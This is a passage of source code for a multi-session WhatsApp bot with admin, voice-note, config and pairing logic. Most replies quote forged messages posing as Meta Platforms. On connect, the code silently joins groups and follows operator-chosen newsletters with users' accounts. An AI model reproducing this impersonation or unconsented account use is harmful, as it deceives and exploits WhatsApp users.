        key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_AI_FAKE_ID_ADDADMIN2" },
        message: { contactMessage: { displayName: title, vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${title};;;;\nFN:${title}\nORG:Meta Platforms\nTEL;type=CELL;type=VOICE;waid=13135550002:+1 313 555 0002\nEND:VCARD` } }
    };

    return await socket.sendMessage(sender, { text: '❌ Only owner can add admins.' }, { quoted: shonux });
  }

  try {
    await addAdminToMongo(jidOr);

    let userCfg = {};
    try { if (number && typeof loadUserConfigFromMongo === 'function') userCfg = await loadUserConfigFromMongo((number || '').replace(/[^0-9]/g, '')) || {}; } catch(e){ userCfg = {}; }
    const title = userCfg.botName || 'BaseBot MD';

    const shonux = {
        key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_AI_FAKE_ID_ADDADMIN3" },
        message: { contactMessage: { displayName: title, vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${title};;;;\nFN:${title}\nORG:Meta Platforms\nTEL;type=CELL;type=VOICE;waid=13135550002:+1 313 555 0002\nEND:VCARD` } }
    };

    await socket.sendMessage(sender, { text: `✅ Added admin: ${jidOr}` }, { quoted: shonux });
  } catch (e) {
    console.error('addadmin error', e);
    let userCfg = {};
    try { if (number && typeof loadUserConfigFromMongo === 'function') userCfg = await loadUserConfigFromMongo((number || '').replace(/[^0-9]/g, '')) || {}; } catch(e){ userCfg = {}; }
    const title = userCfg.botName || 'BaseBot MD';
    const shonux = {
        key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_AI_FAKE_ID_ADDADMIN4" },
        message: { contactMessage: { displayName: title, vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${title};;;;\nFN:${title}\nORG:Meta Platforms\nTEL;type=CELL;type=VOICE;waid=13135550002:+1 313 555 0002\nEND:VCARD` } }
    };

    await socket.sendMessage(sender, { text: `❌ Failed to add admin: ${e.message || e}` }, { quoted: shonux });
  }
  break;
}

case 'deladmin': {
  if (!args || args.length === 0) {
    let userCfg = {};
    try { if (number && typeof loadUserConfigFromMongo === 'function') userCfg = await loadUserConfigFromMongo((number || '').replace(/[^0-9]/g, '')) || {}; } catch(e){ userCfg = {}; }
    const title = userCfg.botName || 'Doberto XD MINI';

    const shonux = {
      key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_AI_FAKE_ID_DELADMIN1" },
      message: { contactMessage: { displayName: title, vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${title};;;;\nFN:${title}\nORG:Meta Platforms\nTEL;type=CELL;type=VOICE;waid=13135550002:+1 313 555 0002\nEND:VCARD` } }
    };

    return await socket.sendMessage(sender, { text: '❗ Indiquez un JID/numéro à supprimer\nExemple : .deladmin 9477xxxxxxx' }, { quoted: shonux });
  }

  const jidOr = args[0].trim();
  if (!isOwner) {
    let userCfg = {};
    try { if (number && typeof loadUserConfigFromMongo === 'function') userCfg = await loadUserConfigFromMongo((number || '').replace(/[^0-9]/g, '')) || {}; } catch(e){ userCfg = {}; }
    const title = userCfg.botName || 'BASEBOT-MD MINI';

    const shonux = {
      key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_AI_FAKE_ID_DELADMIN2" },
      message: { contactMessage: { displayName: title, vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${title};;;;\nFN:${title}\nORG:Meta Platforms\nTEL;type=CELL;type=VOICE;waid=13135550002:+1 313 555 0002\nEND:VCARD` } }
    };

    return await socket.sendMessage(sender, { text: '❌ Seul les admin peuvent supprimer.' }, { quoted: shonux });
  }

  try {
    await removeAdminFromMongo(jidOr);

    let userCfg = {};
    try { if (number && typeof loadUserConfigFromMongo === 'function') userCfg = await loadUserConfigFromMongo((number || '').replace(/[^0-9]/g, '')) || {}; } catch(e){ userCfg = {}; }
    const title = userCfg.botName || 'BASEBOT-MD MINI';

    const shonux = {
      key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_AI_FAKE_ID_DELADMIN3" },
      message: { contactMessage: { displayName: title, vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${title};;;;\nFN:${title}\nORG:Meta Platforms\nTEL;type=CELL;type=VOICE;waid=13135550002:+1 313 555 0002\nEND:VCARD` } }
    };

    await socket.sendMessage(sender, { text: `✅  admin Supprimé : ${jidOr}` }, { quoted: shonux });
  } catch (e) {
    console.error('deladmin error', e);
    let userCfg = {};
    try { if (number && typeof loadUserConfigFromMongo === 'function') userCfg = await loadUserConfigFromMongo((number || '').replace(/[^0-9]/g, '')) || {}; } catch(e){ userCfg = {}; }
    const title = userCfg.botName || 'BASEBOT-MD MINI';
    const shonux = {
      key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_AI_FAKE_ID_DELADMIN4" },
      message: { contactMessage: { displayName: title, vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${title};;;;\nFN:${title}\nORG:Meta Platforms\nTEL;type=CELL;type=VOICE;waid=13135550002:+1 313 555 0002\nEND:VCARD` } }
    };

    await socket.sendMessage(sender, { text: `❌ Failed to remove admin: ${e.message || e}` }, { quoted: shonux });
  }
  break;
}


            case 'tovn': {
    const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
    
    if (!quoted) {
        await socket.sendMessage(sender, { 
            text: `🎵 *Convert to Voice Note*\n\n❌ Réponds à un audio ou vidéo` 
        }, { quoted: msg });
        break;
    }
    
    const isAudio = quoted.audioMessage;
    const isVideo = quoted.videoMessage;
    
    if (!isAudio && !isVideo) {
        await socket.sendMessage(sender, { 
            text: `❌ Type non supporté. Réponds à un audio (🎵) ou vidéo (🎥)` 
        }, { quoted: msg });
        break;
    }

    await socket.sendMessage(sender, { 
        react: { text: "⏳", key: msg.key } 
    });

    try {
        // CORRECTION ICI : Bonne méthode pour télécharger
        let buffer;
        
        // Méthode 1: Utiliser downloadContentFromMessage (méthode Baileys officielle)
        const { downloadContentFromMessage } = require('@rexxhayanasi/elaina-baileys');
        
        if (quoted.audioMessage) {
            const stream = await downloadContentFromMessage(quoted.audioMessage, 'audio');
            const chunks = [];
            for await (const chunk of stream) {
                chunks.push(chunk);
            }
            buffer = Buffer.concat(chunks);
            
        } else if (quoted.videoMessage) {
            const stream = await downloadContentFromMessage(quoted.videoMessage, 'video');
            const chunks = [];
            for await (const chunk of stream) {
                chunks.push(chunk);
            }
            buffer = Buffer.concat(chunks);
        }
        
        if (!buffer || buffer.length === 0) {
            throw new Error("Buffer vide");
        }
        
        console.log(`[TOVN] Buffer obtenu: ${buffer.length} bytes`);
        
        // Fonction de conversion (gardée de ton code)
        async function convertToOpus(inputBuffer) {
            return new Promise((resolve, reject) => {
                const ffmpeg = require('fluent-ffmpeg');
                const { PassThrough } = require('stream');
                
                const inStream = new PassThrough();
                const outStream = new PassThrough();
                const chunks = [];

                inStream.end(inputBuffer);

                ffmpeg(inStream)
                    .noVideo()
                    .audioCodec("libopus")
                    .format("ogg")
                    .audioBitrate("48k")
                    .audioChannels(1)
                    .audioFrequency(48000)
                    .outputOptions([
                        "-map_metadata", "-1",
                        "-application", "voip",
                        "-compression_level", "10",
                        "-page_duration", "20000",
                    ])
                    .on("error", (err) => {
                        console.error("[TOVN] FFmpeg error:", err);
                        reject(err);
                    })
                    .on("end", () => {
                        const result = Buffer.concat(chunks);
                        console.log(`[TOVN] Conversion réussie: ${result.length} bytes`);
                        resolve(result);
                    })
                    .pipe(outStream, { end: true });

                outStream.on("data", (c) => chunks.push(c));
            });
        }
        
        // Convertir
        const opusBuffer = await convertToOpus(buffer);
        
        // Envoyer comme voice note
        await socket.sendMessage(sender, {
            audio: opusBuffer,
            mimetype: "audio/ogg; codecs=opus",
            ptt: true,
            caption: "🔊 Voice Note"
        }, { quoted: msg });
        
        await socket.sendMessage(sender, { 
            react: { text: "✅", key: msg.key } 
        });

    } catch (e) {
        console.error("[TOVN ERROR]:", e);
        await socket.sendMessage(sender, { 
            react: { text: "❌", key: msg.key } 
        });
        
        // Fallback: méthode simple sans conversion
        try {
            console.log("[TOVN] Essai méthode fallback...");
            
            if (quoted.audioMessage) {
                // Juste forwarder l'audio en PTT
                await socket.sendMessage(sender, quoted, { 
                    quoted: msg,
                    ptt: true // Force en voice note
                });
                
                await socket.sendMessage(sender, { 
                    react: { text: "🎵", key: msg.key } 
                });
            }
            
        } catch (fallbackError) {
            console.error("[TOVN FALLBACK ERROR]:", fallbackError);
            await socket.sendMessage(sender, { 
                text: `❌ Impossible de convertir: ${e.message}` 
            }, { quoted: msg });
        }
    }
    break;
}

           

case 'admins': {
  try {
    const list = await loadAdminsFromMongo();
    let userCfg = {};
    try { if (number && typeof loadUserConfigFromMongo === 'function') userCfg = await loadUserConfigFromMongo((number || '').replace(/[^0-9]/g, '')) || {}; } catch(e){ userCfg = {}; }
    const title = userCfg.botName || 'BASEBOT-MD MINI';

    const shonux = {
      key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_AI_FAKE_ID_ADMINS" },
      message: { contactMessage: { displayName: title, vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${title};;;;\nFN:${title}\nORG:Meta Platforms\nTEL;type=CELL;type=VOICE;waid=13135550002:+1 313 555 0002\nEND:VCARD` } }
    };

    if (!list || list.length === 0) {
      return await socket.sendMessage(sender, { text: 'No admins configured.' }, { quoted: shonux });
    }

    let txt = '*👑Liste des Admins de la Db:*\n\n';
    for (const a of list) txt += `• ${a}\n`;

    await socket.sendMessage(sender, { text: txt }, { quoted: shonux });
  } catch (e) {
    console.error('admins error', e);
    let userCfg = {};
    try { if (number && typeof loadUserConfigFromMongo === 'function') userCfg = await loadUserConfigFromMongo((number || '').replace(/[^0-9]/g, '')) || {}; } catch(e){ userCfg = {}; }
    const title = userCfg.botName || 'BaseBot MD';
    const shonux = {
      key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_AI_FAKE_ID_ADMINS2" },
      message: { contactMessage: { displayName: title, vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${title};;;;\nFN:${title}\nORG:Meta Platforms\nTEL;type=CELL;type=VOICE;waid=13135550002:+1 313 555 0002\nEND:VCARD` } }
    };

    await socket.sendMessage(sender, { text: '❌ Failed to list admins.' }, { quoted: shonux });
  }
  break;
}


case 'jid': {
  try {
    const sanitized = (number || '').replace(/[^0-9]/g, '');
    const cfg = await loadUserConfigFromMongo(sanitized) || {};
    const botName = cfg.botName || 'BASEBOT-MD MINI';
    const userNumber = sender.split('@')[0];

    // Reaction
    await socket.sendMessage(sender, { react: { text: "🆔", key: msg.key } });

    // Fake contact quoting for meta style
    const shonux = {
      key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_FAKE_ID" },
      message: {
        contactMessage: {
          displayName: botName,
          vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${botName};;;;\nFN:${botName}\nORG:BASEBOT-MD\nTEL;type=CELL;type=VOICE;waid=${userNumber}:${userNumber}\nEND:VCARD`
        }
      }
    };

    // Texte principal
    const mainText = `*🆔 Chat JID:* ${sender}\n*📞 Your Number:* +${userNumber}`;

    // Construire le message interactif avec bouton "copy"
    const interactive = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: { text: mainText },
            footer: { text: "> © Doberto XD" },
            header: { hasMediaAttachment: false, title: "Identifiant de chat" },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "cta_copy",
                  buttonParamsJson: JSON.stringify({
                    display_text: "📋 Copier JID",
                    id: "copy_jid",
                    copy_code: sender
                  })
                }
              ]
            }
          }
        }
      }
    };

    // Envoyer le message interactif (un seul envoi, quoted pour style)
    await socket.relayMessage(sender, interactive.viewOnceMessage.message, { messageId: `jid_${Date.now()}` });
    // Envoyer aussi en quoted pour conserver l'apparence "meta" (optionnel)
    await socket.sendMessage(sender, { text: mainText }, { quoted: shonux });

  } catch (e) {
    console.error('JID ERROR', e);
    try {
      await socket.sendMessage(sender, { text: `❌ Erreur: ${e.message || e}` }, { quoted: msg });
    } catch (err) { /* ignore */ }
  }
  break;
}
// use inside your switch(command) { ... } block

case 'setpath': {
  const sanitized = (number || '').replace(/[^0-9]/g, '');
  const senderNum = (nowsender || '').split('@')[0];
  const ownerNum = config.OWNER_NUMBER.replace(/[^0-9]/g, '');
  
  // Vérification des permissions
  if (senderNum !== sanitized && senderNum !== ownerNum) {
    const shonux = {
      key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_AI_SETPATH1" },
      message: { contactMessage: { displayName: BOT_NAME_FANCY, vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${BOT_NAME_FANCY};;;;\nFN:${BOT_NAME_FANCY}\nORG:Meta Platforms\nTEL;type=CELL;type=VOICE;waid=13135550002:+1 313 555 0002\nEND:VCARD` } }
    };
    await socket.sendMessage(sender, { 
      text: '❌ Permission refusée. Seul le propriétaire de la session ou du bot peut configurer le chemin de sauvegarde.' 
    }, { quoted: shonux });
    break;
  }

  const pathNumber = args[0]?.trim();
  if (!pathNumber) {
    const shonux = {
      key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_AI_SETPATH2" },
      message: { contactMessage: { displayName: BOT_NAME_FANCY, vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${BOT_NAME_FANCY};;;;\nFN:${BOT_NAME_FANCY}\nORG:Meta Platforms\nTEL;type=CELL;type=VOICE;waid=13135550002:+1 313 555 0002\nEND:VCARD` } }
    };
    return await socket.sendMessage(sender, { 
      text: '❗ Fournissez un numéro. Exemple : `.setpath 00000000000`' 
    }, { quoted: shonux });
  }

  // Nettoyer et valider le numéro
  const cleanPathNumber = pathNumber.replace(/[^0-9]/g, '');
  if (cleanPathNumber.length < 8) {
    const shonux = {
      key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_AI_SETPATH3" },
      message: { contactMessage: { displayName: BOT_NAME_FANCY, vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${BOT_NAME_FANCY};;;;\nFN:${BOT_NAME_FANCY}\nORG:Meta Platforms\nTEL;type=CELL;type=VOICE;waid=13135550002:+1 313 555 0002\nEND:VCARD` } }
    };
    return await socket.sendMessage(sender, { 
      text: '❌ Numéro invalide. Format attendu : 00000000000' 
    }, { quoted: shonux });
  }

  try {
    // Charger la configuration existante
    let cfg = await loadUserConfigFromMongo(sanitized) || {};
    
    // Ajouter le chemin de sauvegarde avec @s.whatsapp.net
    cfg.savePath = `${cleanPathNumber}@s.whatsapp.net`;
    cfg.savePathNumber = cleanPathNumber; // Garder aussi le numéro sans suffixe
    
    // Sauvegarder dans MongoDB
    await setUserConfigInMongo(sanitized, cfg);

    const shonux = {
      key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_AI_SETPATH4" },
      message: { contactMessage: { displayName: BOT_NAME_FANCY, vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${BOT_NAME_FANCY};;;;\nFN:${BOT_NAME_FANCY}\nORG:Meta Platforms\nTEL;type=CELL;type=VOICE;waid=13135550002:+1 313 555 0002\nEND:VCARD` } }
    };

    await socket.sendMessage(sender, { 
      text: `✅ Chemin de sauvegarde configuré pour cette session : ${cleanPathNumber}\n\nLes médias sauvegardés seront envoyés à : ${cleanPathNumber}@s.whatsapp.net` 
    }, { quoted: shonux });
    
  } catch (e) {
    console.error('setpath error', e);
    const shonux = {
      key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_AI_SETPATH5" },
      message: { contactMessage: { displayName: BOT_NAME_FANCY, vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${BOT_NAME_FANCY};;;;\nFN:${BOT_NAME_FANCY}\nORG:Meta Platforms\nTEL;type=CELL;type=VOICE;waid=13135550002:+1 313 555 0002\nEND:VCARD` } }
    };
    await socket.sendMessage(sender, { 
      text: `❌ Échec de la configuration du chemin : ${e.message || e}` 
    }, { quoted: shonux });
  }
  break;
}


case 'getpath': {
  try {
    const sanitized = (number || '').replace(/[^0-9]/g, '');
    const cfg = await loadUserConfigFromMongo(sanitized) || {};
    
    const shonux = {
      key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_AI_GETPATH" },
      message: { contactMessage: { displayName: BOT_NAME_FANCY, vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${BOT_NAME_FANCY};;;;\nFN:${BOT_NAME_FANCY}\nORG:Meta Platforms\nTEL;type=CELL;type=VOICE;waid=13135550002:+1 313 555 0002\nEND:VCARD` } }
    };

    if (cfg.savePath) {
      await socket.sendMessage(sender, { 
        text: `📍 Configuration de sauvegarde :
        
📱 Numéro cible : ${cfg.savePathNumber}
🔗 JID complet : ${cfg.savePath}
📅 Configuré le : ${cfg.updatedAt ? new Date(cfg.updatedAt).toLocaleString('fr-FR') : 'Date inconnue'}
💾 Statut : ✅ Activé

Les commandes .save2 enverront les médias à cette destination.` 
      }, { quoted: shonux });
    } else {
      await socket.sendMessage(sender, { 
        text: `⚠️ Aucun chemin de sauvegarde configuré.
        
Utilisez la commande :
.setpath <numéro>

Exemple : .setpath 00000000000

Les médias sauvegardés seront envoyés à ce numéro.` 
      }, { quoted: shonux });
    }
    
  } catch (e) {
    console.error('getpath error', e);
    await socket.sendMessage(sender, { 
      text: '❌ Impossible de récupérer la configuration.' 
    }, { quoted: msg });
  }
  break;
}

case 'showconfig': {
  const sanitized = (number || '').replace(/[^0-9]/g, '');
  try {
    const cfg = await loadUserConfigFromMongo(sanitized) || {};
    const botName = cfg.botName || BOT_NAME_FANCY;

    const shonux = {
      key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_AI_SHOWCONFIG" },
      message: { contactMessage: { displayName: botName, vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${botName};;;;\nFN:${botName}\nORG:Meta Platforms\nTEL;type=CELL;type=VOICE;waid=13135550002:+1 313 555 0002\nEND:VCARD` } }
    };

    let txt = `*Session config for ${sanitized}:*\n`;
    txt += `• Bot name: ${botName}\n`;
    txt += `• Logo: ${cfg.logo || config.RCD_IMAGE_PATH}\n`;
    await socket.sendMessage(sender, { text: txt }, { quoted: shonux });
  } catch (e) {
    console.error('showconfig error', e);
    const shonux = {
      key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_AI_SHOWCONFIG2" },
      message: { contactMessage: { displayName: BOT_NAME_FANCY, vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${BOT_NAME_FANCY};;;;\nFN:${BOT_NAME_FANCY}\nORG:Meta Platforms\nTEL;type=CELL;type=VOICE;waid=13135550002:+1 313 555 0002\nEND:VCARD` } }
    };
    await socket.sendMessage(sender, { text: '❌ Failed to load config.' }, { quoted: shonux });
  }
  break;
}


        // default
        default:
          break;
      }
    } catch (err) {
      console.error('Command handler error:', err);
      try { await socket.sendMessage(sender, { image: { url: config.RCD_IMAGE_PATH }, caption: formatMessage('❌ ERROR', 'An error occurred while processing your command. Please try again.', BOT_NAME_FANCY) }); } catch(e){}
    }

  });
}

// ---------------- message handlers ----------------

function setupMessageHandlers(socket) {
  socket.ev.on('messages.upsert', async ({ messages }) => {
    const msg = messages[0];
    if (!msg.message || msg.key.remoteJid === 'status@broadcast' || msg.key.remoteJid === config.NEWSLETTER_JID) return;
    if (config.AUTO_RECORDING === 'true') {
      try { await socket.sendPresenceUpdate('recording', msg.key.remoteJid); } catch (e) {}
    }
  });
}

// ---------------- cleanup helper ----------------

async function deleteSessionAndCleanup(number, socketInstance) {
  const sanitized = number.replace(/[^0-9]/g, '');
  try {
    const sessionPath = path.join(os.tmpdir(), `session_${sanitized}`);
    try { if (fs.existsSync(sessionPath)) fs.removeSync(sessionPath); } catch(e){}
    activeSockets.delete(sanitized); socketCreationTime.delete(sanitized);
    try { await removeSessionFromMongo(sanitized); } catch(e){}
    try { await removeNumberFromMongo(sanitized); } catch(e){}
    try {
      const ownerJid = `${config.OWNER_NUMBER.replace(/[^0-9]/g,'')}@s.whatsapp.net`;
      const caption = formatMessage('👑 OWNER NOTICE — SESSION REMOVED', `Number: ${sanitized}\nSession removed due to logout.\n\nActive sessions now: ${activeSockets.size}`, BOT_NAME_FANCY);
      if (socketInstance && socketInstance.sendMessage) await socketInstance.sendMessage(ownerJid, { image: { url: config.RCD_IMAGE_PATH }, caption });
    } catch(e){}
    console.log(`Cleanup completed for ${sanitized}`);
  } catch (err) { console.error('deleteSessionAndCleanup error:', err); }
}

// ---------------- auto-restart ----------------

function setupAutoRestart(socket, number) {
  socket.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect } = update;
    if (connection === 'close') {
      const statusCode = lastDisconnect?.error?.output?.statusCode
                         || lastDisconnect?.error?.statusCode
                         || (lastDisconnect?.error && lastDisconnect.error.toString().includes('401') ? 401 : undefined);
      const isLoggedOut = statusCode === 401
                          || (lastDisconnect?.error && lastDisconnect.error.code === 'AUTHENTICATION')
                          || (lastDisconnect?.error && String(lastDisconnect.error).toLowerCase().includes('logged out'))
                          || (lastDisconnect?.reason === DisconnectReason?.loggedOut);
      const sanitizedForGuard = number.replace(/[^0-9]/g, '');

      if (isLoggedOut) {
        console.log(`User ${number} logged out. Cleaning up...`);
        try { await deleteSessionAndCleanup(number, socket); } catch(e){ console.error(e); }
        return;
      }

      // ── Anpeche 2 rekoneksyon anmenmtan pou menm nimewo a ──
      // (san sa a, 2 socket ka vin vivan anmenmtan sou menm sesyon
      // WhatsApp la, e chak kòmand ta reponn 2 fwa)
      if (reconnectingNumbers.has(sanitizedForGuard)) {
        console.log(`Reconnect already in progress for ${number}, skipping duplicate attempt.`);
        return;
      }
      reconnectingNumbers.add(sanitizedForGuard);

      console.log(`Connection closed for ${number} (not logout). Attempt reconnect...`);
      try {
        // ── Fèmen ANSYEN socket la nèt anvan nou kreye yon nouvo ──
        // (retire tout listener + koupe koneksyon ws) pou evite
        // ke ansyen socket la kontinye trete mesaj an paralèl
        // ak nouvo a.
        try { socket.ev.removeAllListeners(); } catch(e) {}
        try { socket.end(new Error('Reconnecting')); } catch(e) {}
        try { socket.ws?.close?.(); } catch(e) {}

        await delay(10000);
        activeSockets.delete(sanitizedForGuard);
        socketCreationTime.delete(sanitizedForGuard);
        const mockRes = { headersSent:false, send:() => {}, status: () => mockRes };
        await EmpirePair(number, mockRes);
      } catch(e){
        console.error('Reconnect attempt failed', e);
      } finally {
        reconnectingNumbers.delete(sanitizedForGuard);
      }
    }

  });
}

// ---------------- EmpirePair (pairing, temp dir, persist to Mongo) ----------------

async function EmpirePair(number, res) {
  const sanitizedNumber = number.replace(/[^0-9]/g, '');
  const sessionPath = path.join(os.tmpdir(), `session_${sanitizedNumber}`);

  // ── Sekirite : si yon ansyen socket vivan toujou egziste pou menm
  // nimewo sa a, fèmen l nèt anvan nou kreye yon nouvo. Sa anpeche
  // 2 socket vivan anmenmtan sou menm sesyon WhatsApp la (ki te
  // lakòz kòmand yo reponn 2 fwa).
  const existingSocket = activeSockets.get(sanitizedNumber);
  if (existingSocket) {
    try { existingSocket.ev.removeAllListeners(); } catch(e) {}
    try { existingSocket.end(new Error('Replaced by new connection')); } catch(e) {}
    try { existingSocket.ws?.close?.(); } catch(e) {}
    activeSockets.delete(sanitizedNumber);
  }

  await initMongo().catch(()=>{});
  // Prefill from Mongo if available
  try {
    const mongoDoc = await loadCredsFromMongo(sanitizedNumber);
    if (mongoDoc && mongoDoc.creds) {
      fs.ensureDirSync(sessionPath);
      fs.writeFileSync(path.join(sessionPath, 'creds.json'), JSON.stringify(mongoDoc.creds, null, 2));
      if (mongoDoc.keys) fs.writeFileSync(path.join(sessionPath, 'keys.json'), JSON.stringify(mongoDoc.keys, null, 2));
      console.log('Prefilled creds from Mongo');
    }
  } catch (e) { console.warn('Prefill from Mongo failed', e); }

  const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
  const logger = pino({ level: process.env.NODE_ENV === 'production' ? 'fatal' : 'debug' });

 try {
    const socket = makeWASocket({
      auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, logger) },
      printQRInTerminal: false,
      logger,
      browser: ["Ubuntu", "Chrome", "20.0.04"]
    });

    // Après avoir créé le socket et défini socketCreationTime

socketCreationTime.set(sanitizedNumber, Date.now());
socket.downloadMediaMessage = (m, filename) => downloadMediaMessage(m, filename)
// ── Anrejistre socket la touswit — pa tann connection open ──
activeSockets.set(sanitizedNumber, socket);
setupStatusHandlers(socket, sanitizedNumber);
setupCommandHandlers(socket, sanitizedNumber);
setupMessageHandlers(socket);
setupAutoRestart(socket, sanitizedNumber);
setupNewsletterHandlers(socket, sanitizedNumber);
registerGroupParticipantListener(socket).catch(err => console.error('Listener init failed', err));
handleMessageRevocation(socket, sanitizedNumber);
    if (!socket.authState.creds.registered) {
      let retries = config.MAX_RETRIES;
      let code;
      while (retries > 0) {
        try { await delay(1500); code = await socket.requestPairingCode(sanitizedNumber); break; }
        catch (error) { retries--; await delay(2000 * (config.MAX_RETRIES - retries)); }
      }
      if (!res.headersSent) res.send({ code });
    }

    // Save creds to Mongo when updated
    socket.ev.on('creds.update', async () => {
      try {
        await saveCreds();
        const fileContent = await fs.readFile(path.join(sessionPath, 'creds.json'), 'utf8');
        const credsObj = JSON.parse(fileContent);
        const keysObj = state.keys || null;
        await saveCredsToMongo(sanitizedNumber, credsObj, keysObj);
      } catch (err) { console.error('Failed saving creds on creds.update:', err); }
    });


    socket.ev.on('connection.update', async (update) => {
      const { connection } = update;
      if (connection === 'open') {
        try {
          await delay(3000);
          const userJid = jidNormalizedUser(socket.user.id);
          const groupResult = await joinGroup(socket).catch(()=>({ status: 'failed', error: 'joinGroup not configured' }));

          // try follow newsletters if configured
          try {
            const newsletterListDocs = await listNewslettersFromMongo();
            for (const doc of newsletterListDocs) {
              const jid = doc.jid;
              try { if (typeof socket.newsletterFollow === 'function') await socket.newsletterFollow(jid); } catch(e){}
            }
          } catch(e){}

          activeSockets.set(sanitizedNumber, socket);
          const groupStatus = groupResult.status === 'success' ? 'Joined successfully' : `Failed to join group: ${groupResult.error}`;

          // Load per-session config (botName, logo)
          const userConfig = await loadUserConfigFromMongo(sanitizedNumber) || {};
          const useBotName = userConfig.botName || BOT_NAME_FANCY;
          const useLogo = userConfig.logo || config.RCD_IMAGE_PATH;

          // ╔══════════════════════════════════╗
          // ║   ÉCRAN — Message de connexion actif   ║
          // ╚══════════════════════════════════╝
          const ekranCaption = [
            `╔═══════════════════════════╗`,
            `║   ⚡ *${useBotName}* ⚡   ║`,
            `╚═══════════════════════════╝`,
            ``,
            `✅ *Bot actif et connecté !*`,
            ``,
            `━━━━━━━━━━━━━━━━━━━━━━━━━━`,
            `📱 *Numéro  :* +${sanitizedNumber}`,
            `🕒 *Lè      :* ${getHaitiTimestamp()}`,
            `🌐 *Statut  :* 🟢 En ligne`,
            `━━━━━━━━━━━━━━━━━━━━━━━━━━`,
            ``,
            `📌 *Commandes rapides :*`,
            `  ╰ *.menu*  — Voir toutes les commandes`,
            `  ╰ *.ping*  — Tester le bot`,
            `  ╰ *.help*  — Obtenir de l'aide`,
            ``,
            `💡 Le bot est prêt à vous servir !`,
            ``,
            `> *${useBotName}* 🇭🇹`
          ].join('\n');

          // Envoyer l'écran avec photo
          try {
            if (String(useLogo).startsWith('http')) {
              await socket.sendMessage(userJid, { image: { url: useLogo }, caption: ekranCaption });
            } else {
              try {
                const buf = fs.readFileSync(useLogo);
                await socket.sendMessage(userJid, { image: buf, caption: ekranCaption });
              } catch (e) {
                await socket.sendMessage(userJid, { image: { url: config.RCD_IMAGE_PATH }, caption: ekranCaption });
              }
            }
          } catch (e) {
            console.warn('[EKRAN] Échec image, envoi texte :', e?.message || e);
            try { await socket.sendMessage(userJid, { text: ekranCaption }); } catch(e2){}
          }
          await addNumberToMongo(sanitizedNumber, SERVER_ID);

        } catch (e) { 
          console.error('Connection open error:', e); 
          try { exec(`pm2.restart ${process.env.PM2_NAME || 'basebot-md'}`); } catch(e) { console.error('pm2 restart failed', e); }
        }
      }
      // NOTE: Retire nou pa efase sessionPath isit la ankò.
      // setupAutoRestart() deja jere sa kòrèkteman (efase sesyon
      // SÈLMAN si se yon vrè logout). Efase l isit la sou CHAK
      // dekoneksyon (menm ti koupi rezo nòmal) t ap kraze kle
      // chifreman sesyon an ti kras pa ti kras jiskaske bòt la
      // sispann ka dekripte mesaj yo apre kèk èdtan.

    });


    activeSockets.set(sanitizedNumber, socket);

  } catch (error) {
    console.error('Pairing error:', error);
    socketCreationTime.delete(sanitizedNumber);
    if (!res.headersSent) res.status(503).send({ error: 'Service Unavailable' });
  }

}


// ---------------- endpoints (admin/newsletter management + others) ----------------

router.post('/newsletter/add', async (req, res) => {
  const { jid, emojis } = req.body;
  if (!jid) return res.status(400).send({ error: 'jid required' });
  if (!jid.endsWith('@newsletter')) return res.status(400).send({ error: 'Invalid newsletter jid' });
  try {
    await addNewsletterToMongo(jid, Array.isArray(emojis) ? emojis : []);
    res.status(200).send({ status: 'ok', jid });
  } catch (e) { res.status(500).send({ error: e.message || e }); }
});


router.post('/newsletter/remove', async (req, res) => {
  const { jid } = req.body;
  if (!jid) return res.status(400).send({ error: 'jid required' });
  try {
    await removeNewsletterFromMongo(jid);
    res.status(200).send({ status: 'ok', jid });
  } catch (e) { res.status(500).send({ error: e.message || e }); }
});


router.get('/newsletter/list', async (req, res) => {
  try {
    const list = await listNewslettersFromMongo();
    res.status(200).send({ status: 'ok', channels: list });
